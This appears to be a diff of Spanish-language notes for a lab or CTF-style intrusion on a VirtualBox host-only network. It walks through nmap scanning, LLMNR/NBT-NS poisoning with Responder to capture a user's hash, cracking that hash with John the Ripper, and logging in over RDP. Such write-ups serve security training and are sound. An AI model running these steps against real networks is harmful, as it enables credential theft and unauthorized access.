@@ -1,8 +1,24 @@
 User.txt
 
-Envenenar red:
-nmap 192.168.56.0/24
-sudo responder -I Interface -v
-Romper hash:
-john -w wordlist hash
-rdesktop -u user -p pass IP
+Empezamos verificando que se ha creado una interfaz de red llamada vboxnet0:
+    - ifconfig
+
+Empezamos escaneado la red con nmap:
+    - Descubrir cuantos hosts hay -> nmap 192.168.56.0/24 -sn -T5
+    - Escaneado de todos los puertos -> nmap -p- -sS --min-rate 5000 --open -vvv IP -oN ports 
+    - Escaneo en profundidad de los puertos abiertos -> nmap -p(lista de puestos) -sCV --min-rate 5000 IP (Ej: nmap -p22,80 -sCV --min-rate 5000 IP )
+ 
+ No hay nada interesante. Probamos hacer un nmap pero ahora por UDP:
+    - sudo nmap -sU --top-ports 1000 -T5 IP
+
+Tampoco vemos nada.
+
+Probamos a envenenar la red:
+    - sudo responder -I Interface -v -> Interface = vboxnet0 
+Esperamo sun rato y aparece un hash de un usuario. Esto se debe a que un usuario a intentado acceder a un recurso compartido a nivel de red y este recurso no existe.
+
+Nos guardamos el hash y probamos a romperlo:
+    - john -w passwords.txt hash
+
+Nos conectamos al PC:
+    - rdesktop -u user -p pass IP
